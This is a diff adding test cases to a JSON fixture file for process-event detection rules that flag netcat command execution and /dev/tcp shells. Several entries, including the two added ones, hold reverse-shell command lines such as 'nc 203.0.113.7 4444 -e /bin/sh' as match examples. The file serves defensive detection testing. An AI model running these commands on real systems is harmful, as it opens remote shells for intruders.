@@ -18,6 +18,8 @@
 {"rule":"alarm.shell.dev_tcp","name":"a script that only mentions tcp","event":{"process.name":"bash","process.exe":"/usr/bin/bash","process.cmdline":"bash /usr/local/bin/check-tcp-port.sh 443"},"expect":"no_match"},
 {"rule":"alarm.netcat.exec","name":"nc -e /bin/sh","event":{"process.name":"nc.traditional","process.exe":"/usr/bin/nc.traditional","process.cmdline":"nc 203.0.113.7 4444 -e /bin/sh"},"expect":"match"},
 {"rule":"alarm.netcat.exec","name":"ncat --sh-exec","event":{"process.name":"ncat","process.exe":"/usr/bin/ncat","process.cmdline":"ncat -l 4444 --sh-exec cat"},"expect":"match"},
+{"rule":"alarm.netcat.exec","name":"nc -e joined to the program (payload form)","event":{"process.name":"nc.traditional","process.exe":"/usr/bin/nc.traditional","process.cmdline":"nc -e/bin/sh 203.0.113.7 4444"},"expect":"match"},
+{"rule":"alarm.netcat.exec","name":"a trailing -e","event":{"process.name":"nc","process.exe":"/usr/bin/nc","process.cmdline":"nc 203.0.113.7 4444 -e"},"expect":"match"},
 {"rule":"alarm.netcat.exec","name":"nc.openbsd -c is TLS, not exec","event":{"process.name":"nc.openbsd","process.exe":"/usr/bin/nc.openbsd","process.cmdline":"nc -c example.org 443"},"expect":"no_match"},
 {"rule":"alarm.netcat.exec","name":"a plain port probe","event":{"process.name":"nc","process.exe":"/usr/bin/nc","process.cmdline":"nc -zv 192.0.2.1 22"},"expect":"no_match"}
 ]
